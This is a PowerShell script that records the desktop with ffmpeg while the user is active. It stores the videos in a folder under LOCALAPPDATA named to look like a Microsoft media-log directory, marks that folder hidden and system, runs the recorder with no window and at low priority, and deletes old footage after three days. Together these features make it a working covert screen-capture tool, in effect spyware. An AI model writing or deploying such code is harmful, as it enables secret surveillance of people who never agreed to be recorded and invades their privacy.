param (
    [string]$OutputDir = (Join-Path $env:LOCALAPPDATA "Microsoft\MediaLogs"),
    [Parameter(Mandatory = $true)][string]$InstallDir
)

# Validate paths
if (-not (Test-Path $InstallDir)) { exit 1 }
if (-not (Test-Path $OutputDir)) {
    New-Item -Path $OutputDir -ItemType Directory -Force | Out-Null
    $folder = Get-Item $OutputDir -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
}

# Load essential assemblies
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class UserActivity {
        [DllImport("user32.dll")]
        public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        public struct LASTINPUTINFO {
            public uint cbSize;
            public uint dwTime;
        }
    }
"@
} catch { exit 1 }

# Global state
$global:isRecording = $false
$global:recordProcess = $null
$FFmpegPath = Join-Path $InstallDir "ffmpeg.exe"

if (-not (Test-Path $FFmpegPath)) { exit 1 }

# Clean old recordings
function Remove-OldRecordings {
    try {
        $cutoffDate = (Get-Date).AddDays(-3)
        Get-ChildItem -Path $OutputDir -Filter "*.mp4" | 
            Where-Object { $_.CreationTime -lt $cutoffDate } | 
            Remove-Item -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Get system idle time
function Get-IdleSeconds {
    try {
        $lastInput = New-Object UserActivity+LASTINPUTINFO
        $lastInput.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($lastInput)
        [UserActivity]::GetLastInputInfo([ref]$lastInput) | Out-Null
        return ([Environment]::TickCount - $lastInput.dwTime) / 1000
    } catch {
        return 0
    }
}

# Start screen recording - FIXED VIDEO PLAYBACK
function Start-ScreenRecording {
    if ($global:isRecording) { return }

    try {
        # Use primary screen dimensions
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $width = $screen.Width
        $height = $screen.Height

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $outputFile = Join-Path $OutputDir "log_$timestamp.mp4"
        
        # FIXED FFMPEG PARAMETERS (PLAYABLE VIDEOS)
        $ffmpegArgs = @(
            "-f", "gdigrab"
            "-framerate", "10"
            "-video_size", "${width}x${height}"
            "-i", "desktop"
            "-c:v", "libx264"
            "-preset", "ultrafast"
            "-crf", "28"
            "-pix_fmt", "yuv420p"
            "-g", "30"                   # Keyframe interval
            "-movflags", "+faststart"    # Critical for playback (metadata at beginning)
            "-fflags", "+genpts"         # Generate PTS if missing
            "-vsync", "1"                # Constant framerate
            "-y", "`"$outputFile`""
        ) -join " "

        $psi = New-Object Diagnostics.ProcessStartInfo
        $psi.FileName = $FFmpegPath
        $psi.Arguments = $ffmpegArgs
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $psi.RedirectStandardInput = $true  # Required for graceful stop
        
        $process = [Diagnostics.Process]::Start($psi)
        $global:recordProcess = $process
        $global:isRecording = $true
        
        # Write PID to file for uninstaller
        $process.Id | Out-File (Join-Path $InstallDir "ffmpeg.pids") -Append
        
        # Set low priority
        Start-Sleep -Milliseconds 500
        (Get-Process -Id $process.Id).PriorityClass = 'BelowNormal'
    } catch {
        $global:isRecording = $false
        $global:recordProcess = $null
    }
}

# Stop recording - GRACEFUL SHUTDOWN FOR PLAYABLE VIDEOS
function Stop-ScreenRecording {
    if (-not $global:isRecording) { return }
    
    try {
        if (-not $global:recordProcess.HasExited) {
            # Send 'q' to FFmpeg for graceful exit
            $global:recordProcess.StandardInput.WriteLine("q")
            $global:recordProcess.StandardInput.Close()
            
            # Wait for proper shutdown
            if (-not $global:recordProcess.WaitForExit(5000)) {
                $global:recordProcess.Kill()
            }
        }
    } catch {
        try { $global:recordProcess.Kill() } catch {}
    }
    
    $global:isRecording = $false
    $global:recordProcess = $null
}

# Main monitoring loop
Remove-OldRecordings

# Start recording immediately on launch
Start-ScreenRecording

while ($true) {
    try {
        $idleTime = Get-IdleSeconds

        # Continue recording if active
        if ($idleTime -lt 3 -and !$global:isRecording) {
            Start-ScreenRecording
        }
        # Stop after 10 seconds of inactivity
        elseif ($idleTime -ge 10 -and $global:isRecording) {
            Stop-ScreenRecording
        }

        # Hourly cleanup
        if ((Get-Date).Minute -eq 0 -and (Get-Date).Second -lt 10) {
            Remove-OldRecordings
        }

        Start-Sleep -Seconds 5
    } catch {
        Start-Sleep -Seconds 10
    }
}